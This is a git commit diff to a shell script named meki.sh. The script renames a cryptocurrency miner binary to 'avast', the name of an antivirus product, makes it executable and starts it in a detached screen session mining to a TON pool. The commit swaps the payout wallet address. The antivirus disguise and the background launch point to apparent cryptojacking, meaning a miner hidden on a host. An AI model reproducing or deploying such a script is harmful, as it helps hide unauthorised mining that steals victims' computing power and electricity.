71d92b21d84984d422c4653536ffdd871c60d5c7
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-02-14 17:29:22 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -12,4 +12,4 @@ mv miner-linux avast
 
 chmod +x avast 
 
-screen -dmS running ./avast run https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+screen -dmS running ./avast run https://next.ton-pool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
